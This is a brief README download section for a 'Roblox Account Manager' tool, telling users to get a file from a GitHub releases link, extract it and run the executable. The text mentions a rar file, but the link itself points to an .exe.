# Download
To install this, head over to the [Releases](https://github.com/Icy-Blox/Roblox-Account-Manager/releases/download/Release/Roblox_Account_Manager.exe) section and download the rar file at the very top, once downloaded, extract the files into a folder on your desktop and run Roblox Account Manager.exe.
